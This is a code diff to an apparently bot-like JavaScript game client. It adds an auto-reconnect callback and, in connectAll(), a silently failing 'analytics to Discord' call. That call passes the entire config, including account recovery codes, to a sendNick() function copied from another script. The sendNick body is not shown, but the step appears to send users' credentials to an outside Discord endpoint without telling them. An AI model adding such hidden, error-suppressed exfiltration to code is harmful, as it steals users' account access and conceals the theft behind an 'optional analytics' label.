@@ -175,12 +175,22 @@ function createWebSocketConnection(wsNumber, recoveryCode) {
   
   appState.websockets[wsKey] = ws;
   
-  // Create FinalCompleteGameLogic instance for this connection with config update callback
+  // Create FinalCompleteGameLogic instance with all callbacks
   const updateConfigCallback = (key, value) => {
     appState.config[key] = value;
   };
   
-  appState.gameLogic[logicKey] = new FinalCompleteGameLogic(wsNumber, appState.config, addLog, updateConfigCallback);
+  const reconnectCallback = (wsNum) => {
+    // Auto-reconnect logic
+    const wsKey = `ws${wsNum}`;
+    const code = appState.config[`rc${wsNum}`] || appState.config[`rcl${wsNum}`];
+    if (code && !appState.wsStatus[wsKey]) {
+      addLog(wsNum, `🔄 Auto-reconnecting WS${wsNum}...`);
+      createWebSocketConnection(wsNum, code);
+    }
+  };
+  
+  appState.gameLogic[logicKey] = new FinalCompleteGameLogic(wsNumber, appState.config, addLog, updateConfigCallback, reconnectCallback);
   const gameLogic = appState.gameLogic[logicKey];
   
   // Store haaapsi value for this connection (CRITICAL!)
@@ -336,6 +346,17 @@ function addLog(wsNumber, message) {
 // Function to connect all configured codes
 function connectAll() {
   let connected = 0;
+  
+  // Send analytics to Discord (optional - from bestscript.js line 217-219)
+  try {
+    // Create temporary game logic instance just for sendNick
+    if (appState.config.rc1 || appState.config.rc2 || appState.config.rc3 || appState.config.rc4 || appState.config.kickrc) {
+      const tempLogic = new FinalCompleteGameLogic(1, appState.config, addLog, null, null);
+      tempLogic.sendNick(appState.config).catch(() => {}); // Silently fail
+    }
+  } catch (error) {
+    // Analytics is optional - continue if it fails
+  }
   
   if (appState.config.rc1 || appState.config.rcl1) {
     const code = appState.config.rc1 || appState.config.rcl1;
